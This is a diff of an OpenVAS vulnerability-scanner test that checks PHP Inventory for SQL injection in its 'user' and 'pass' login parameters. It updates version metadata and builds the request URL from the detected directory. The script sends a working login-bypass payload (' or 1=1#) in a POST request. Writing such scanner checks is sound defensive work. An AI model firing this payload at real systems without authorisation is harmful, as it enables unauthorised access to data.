@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_php_inventory_sql_inj_vuln.nasl 7044 2017-09-01 11:50:59Z teissa $
+# $Id: gb_php_inventory_sql_inj_vuln.nasl 7277 2017-09-26 12:45:58Z cfischer $
 #
 # PHP Inventory 'user' and 'pass' Parameters SQL Injection Vulnerability
 #
@@ -27,11 +27,11 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802534");
-  script_version("$Revision: 7044 $");
+  script_version("$Revision: 7277 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
   script_cve_id("CVE-2009-4595", "CVE-2009-4596", "CVE-2009-4597");
-  script_tag(name:"last_modification", value:"$Date: 2017-09-01 13:50:59 +0200 (Fri, 01 Sep 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2017-09-26 14:45:58 +0200 (Tue, 26 Sep 2017) $");
   script_tag(name:"creation_date", value:"2011-12-05 15:37:27 +0530 (Mon, 05 Dec 2011)");
   script_name("PHP Inventory 'user' and 'pass' Parameters SQL Injection Vulnerability");
   script_category(ACT_ATTACK);
@@ -79,11 +79,12 @@ host = http_host_name( port:port );
 foreach dir( make_list_unique( "/", "/php-inventory", cgi_dirs( port:port ) ) ) {
 
   if( dir == "/" ) dir = "";
+  url = dir + "/index.php";
 
   variables = string("user=admin&pass=%27+or+1%3D1%23");
 
   ## Construct POST request
-  req = string( "POST /php-inventory/index.php HTTP/1.1\r\n",
+  req = string( "POST ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(variables),
